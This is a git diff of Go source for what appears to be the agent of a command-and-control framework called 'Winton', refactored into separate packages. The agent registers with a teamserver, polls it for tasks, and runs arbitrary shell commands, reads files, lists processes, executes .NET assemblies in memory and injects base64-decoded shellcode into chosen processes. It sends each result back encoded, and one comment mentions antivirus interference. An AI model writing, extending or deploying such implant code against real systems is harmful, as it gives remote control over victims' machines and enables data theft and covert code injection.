@@ -5,14 +5,19 @@ import (
 	"fmt"
 	"os"
 	"os/user"
+	"strconv"
 	"strings"
 	"time"
-	"strconv"
+
+	"Winton/cmd/commands"
+	"Winton/cmd/http"
+	"Winton/cmd/utils"
 )
 
 var (
 	Teamserver    = "http://127.0.0.1"
 	Port          = "80"
+	httpClient    = http.NewHTTPClient()
 	URL           string
 	RegisterAgent string
 	GetTask       string
@@ -45,7 +50,8 @@ func register(agent Agent, endpoint string) ([]byte, error) {
 		return nil, err
 	}
 
-	res, err := http_post_json(endpoint, jsonAgent)
+	// res, err := httpClient.http_post_json(endpoint, jsonAgent)
+	res, err := httpClient.PostJSON(endpoint, jsonAgent)
 	if err != nil {
 		fmt.Println(err)
 		return nil, err
@@ -55,7 +61,7 @@ func register(agent Agent, endpoint string) ([]byte, error) {
 }
 
 func check_tasks(agent Agent, endpoint string) ([]byte, error) {
-	res, err := http_get(endpoint + "/" + agent.UID)
+	res, err := httpClient.Get(endpoint + "/" + agent.UID)
 	if err != nil {
 		fmt.Println(err)
 		return nil, err
@@ -65,7 +71,7 @@ func check_tasks(agent Agent, endpoint string) ([]byte, error) {
 }
 
 func post_results(agent Agent, endpoint string, result []byte, command_id string) ([]byte, error) {
-	res, err := http_post_json(endpoint+"/"+command_id, result)
+	res, err := httpClient.PostJSON(endpoint+"/"+command_id, result)
 	if err != nil {
 		fmt.Println(err)
 		return nil, err
@@ -159,7 +165,7 @@ func main() {
 
 			fmt.Println("[*] Current working directory: " + cwd)
 
-			files, err := ls(cwd)
+			files, err := commands.Ls(cwd)
 			if err != nil {
 				fmt.Println("[!] Error listing files")
 				fmt.Println(err)
@@ -174,7 +180,7 @@ func main() {
 			}
 
 			command_id := task["CommandID"].(string)
-			result := b64_encode((jsonFiles))
+			result := utils.Base64_Encode((jsonFiles))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -203,7 +209,7 @@ func main() {
 			fmt.Println("[*] Found 'whoami', executing command")
 
 			command_id := task["CommandID"].(string)
-			result := b64_encode([]byte(whoami()))
+			result := utils.Base64_Encode([]byte(commands.Whoami()))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -231,7 +237,7 @@ func main() {
 		case "pwd":
 			fmt.Println("[*] Found 'pwd', executing command")
 			command_id := task["CommandID"].(string)
-			result := b64_encode([]byte(pwd()))
+			result := utils.Base64_Encode([]byte(commands.Pwd()))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -261,14 +267,14 @@ func main() {
 			fmt.Println("[*] Found 'cat', executing command")
 			fmt.Println("[*] Cat Args: " + strings.Join(command_args, " "))
 			command_id := task["CommandID"].(string)
-			result, err := cat(strings.Join(command_args, " "))
+			result, err := commands.Cat(strings.Join(command_args, " "))
 			if err != nil {
 				fmt.Println("[!] Error executing cat command")
 				fmt.Println(err)
 				return
 			}
 
-			result = b64_encode([]byte(result))
+			result = utils.Base64_Encode([]byte(result))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -298,14 +304,14 @@ func main() {
 			fmt.Println("[*] Found 'shell', executing command")
 			fmt.Println("[*] Shell Args: " + strings.Join(command_args, " "))
 			command_id := task["CommandID"].(string)
-			shell_res, err := shell(strings.Join(command_args, " "))
+			shell_res, err := commands.Shell(strings.Join(command_args, " "))
 			if err != nil {
 				fmt.Println("[!] There was an error executing the shell command, could be AV or syntax error")
 				fmt.Println("[!] Regardless, don't kill just yet.")
 				// shell_res = "[Agent] There was an error executing " + command + ", check for AV or syntax errors."
 			}
 
-			result := b64_encode([]byte(shell_res))
+			result := utils.Base64_Encode([]byte(shell_res))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -335,14 +341,14 @@ func main() {
 		case "ps":
 			fmt.Println("[*] Found 'ps', executing command")
 			command_id := task["CommandID"].(string)
-			ps_res, err := ps()
+			ps_res, err := commands.Ps()
 			if err != nil {
 				fmt.Println("[!] Error executing ps command")
 				fmt.Println(err)
 				return
 			}
 
-			result := b64_encode([]byte(ps_res))
+			result := utils.Base64_Encode([]byte(ps_res))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -372,9 +378,9 @@ func main() {
 		case "getpid":
 			fmt.Println("[*] Found 'getpid', executing command")
 			command_id := task["CommandID"].(string)
-			pid_res := get_pid()
+			pid_res := commands.Get_pid()
 
-			result := b64_encode([]byte(pid_res))
+			result := utils.Base64_Encode([]byte(pid_res))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -400,12 +406,12 @@ func main() {
 			}
 
 			fmt.Println("[*] Results sent successfully")
-		
+
 		case "execute-assembly":
 			fmt.Println("[!] Found 'execute-assembly', executing .NET assembly in memory now...")
 			fmt.Println("[!] Execute-Assembly Args: " + strings.Join(command_args, " "))
 			command_id := task["CommandID"].(string)
-			raw_bytes, err := b64_decode(command_args[0])
+			raw_bytes, err := utils.Base64_Decode(command_args[0])
 			if err != nil {
 				fmt.Println("[!] Error decoding base64 encoded assembly")
 				fmt.Println(err)
@@ -414,14 +420,14 @@ func main() {
 
 			fmt.Println("[*] Assembly length:", len(raw_bytes))
 
-			res, err := execute_assembly(raw_bytes)
+			res, err := commands.Execute_Assembly(raw_bytes)
 			if err != nil {
 				fmt.Println("[!] Error executing assembly")
 				fmt.Println(err)
 				return
 			}
 
-			result := b64_encode([]byte(res))
+			result := utils.Base64_Encode([]byte(res))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -448,7 +454,6 @@ func main() {
 
 			fmt.Println("[*] Results sent successfully")
 
-		
 		case "inject":
 			fmt.Println("[*] Found 'inject', executing command")
 			fmt.Println("[*] Inject Args: " + strings.Join(command_args, " "))
@@ -461,14 +466,14 @@ func main() {
 				return
 			}
 
-			shellcode, err := b64_decode(command_args[1])
+			shellcode, err := utils.Base64_Decode(command_args[1])
 			if err != nil {
 				fmt.Println("[!] Error converting PID to integer")
 				fmt.Println(err)
 				return
 			}
 
-			inject_res, err := inject(PIDInt, shellcode)
+			inject_res, err := commands.Inject(PIDInt, shellcode)
 			if err != nil {
 				fmt.Println("[!] Error injecting shellcode")
 				fmt.Println(err)
@@ -477,9 +482,9 @@ func main() {
 
 			var result string
 			if inject_res == "OK" {
-				result = b64_encode([]byte("Shellcode injected successfully"))
+				result = utils.Base64_Encode([]byte("Shellcode injected successfully"))
 			} else {
-				result = b64_encode([]byte("Error injecting shellcode"))
+				result = utils.Base64_Encode([]byte("Error injecting shellcode"))
 			}
 
 			result_struct := TaskResult{
